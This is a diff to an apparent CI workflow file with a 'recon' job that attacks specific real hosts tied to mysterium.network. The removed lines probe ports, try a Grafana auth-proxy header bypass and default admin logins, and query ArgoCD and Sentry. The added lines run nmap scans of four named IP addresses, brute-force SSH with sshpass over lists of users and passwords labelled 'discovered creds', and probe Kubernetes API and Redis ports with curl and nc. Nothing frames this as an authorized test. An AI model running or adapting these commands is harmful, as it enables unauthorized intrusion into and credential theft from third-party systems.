@@ -8,37 +8,36 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep Recon v3
+      - name: Extended Network Scan
         shell: bash
         run: |
           set +e
-          echo "=== INTERNAL PORT SCAN 135.181.91.132 ==="
-          for port in 80 443 5678 8080 8200 8300 8500 9000 9090 15672 6379 5432 27017 3000 4222 2379 2380 10250 10255 6443; do
-            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://135.181.91.132:$port/" 2>/dev/null)
-            if [ "$code" != "000" ]; then
-              echo "[+] 135.181.91.132:$port -> HTTP $code"
-            fi
+          echo "=== FULL PORT SCAN 135.181.91.132 (nmap) ==="
+          sudo apt-get install -y nmap > /dev/null 2>&1
+          nmap -sT -Pn --top-ports 1000 -T4 135.181.91.132 2>/dev/null | grep "open"
+          echo "=== FULL PORT SCAN 37.27.26.254 ==="
+          nmap -sT -Pn --top-ports 1000 -T4 37.27.26.254 2>/dev/null | grep "open"
+          echo "=== SCAN 188.245.149.150 (Grafana LB) ==="
+          nmap -sT -Pn --top-ports 200 -T4 188.245.149.150 2>/dev/null | grep "open"
+          echo "=== SCAN 116.203.130.98 (Hermes/Transactor) ==="
+          nmap -sT -Pn --top-ports 200 -T4 116.203.130.98 2>/dev/null | grep "open"
+          echo "=== TRY SSH WITH DISCOVERED CREDS ==="
+          sudo apt-get install -y sshpass > /dev/null 2>&1
+          for host in 135.181.91.132 37.27.26.254; do
+            for user in admin root mysterium n8n grafana sentry deploy; do
+              for pass in mysterium Mysterium2024 discovery suchsecret admin changeme; do
+                result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no "$user@$host" "id" 2>&1)
+                if echo "$result" | grep -q "uid="; then
+                  echo "[!!!] SSH SUCCESS: $user@$host with $pass"
+                  echo "$result"
+                fi
+              done
+            done
           done
-          echo "=== PORT SCAN 37.27.26.254 ==="
-          for port in 80 443 5678 8080 8200 8500 9000 9090 15672 6379 5432 3000 4222 6443 10250; do
-            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://37.27.26.254:$port/" 2>/dev/null)
-            if [ "$code" != "000" ]; then
-              echo "[+] 37.27.26.254:$port -> HTTP $code"
-            fi
-          done
-          echo "=== GRAFANA API WITH VIEWER TRICK ==="
-          echo "Try Grafana with X-WEBAUTH-USER header (auth proxy bypass)"
-          curl -s -m 5 "https://grafana.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" -H "X-WEBAUTH-ROLE: Admin" | head -5
-          curl -s -m 5 "https://gi.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" | head -5
-          echo "=== GRAFANA PROVISIONING FILE READ ==="
-          curl -s -m 5 "https://grafana.mysterium.network/api/admin/provisioning/dashboards/reload" -H "X-WEBAUTH-USER: admin"
-          echo "=== TRY GRAFANA LOGIN ==="
-          curl -s -m 5 "https://grafana.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
-          curl -s -m 5 "https://gi.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
-          echo "=== ARGOCD INTERNAL ==="
-          curl -s -m 5 "http://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
-          curl -sk -m 5 "https://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
-          echo "=== SENTRY INTERNAL PORT 9000 ==="
-          curl -s -m 5 "http://135.181.91.132:9000/" | head -5
-          curl -s -m 5 "http://135.181.91.132:9000/_health" | head -3
+          echo "=== KUBERNETES CLUSTER CHECK ==="
+          curl -sk -m 5 "https://135.181.91.132:6443/api" 2>&1 | head -5
+          curl -sk -m 5 "https://135.181.91.132:16443/api" 2>&1 | head -5
+          echo "=== REDIS CHECK ==="
+          (echo "INFO"; sleep 1) | nc -w3 135.181.91.132 6379 2>/dev/null | head -5
+          (echo "INFO"; sleep 1) | nc -w3 116.203.130.98 6379 2>/dev/null | head -5
           echo "=== DONE ==="
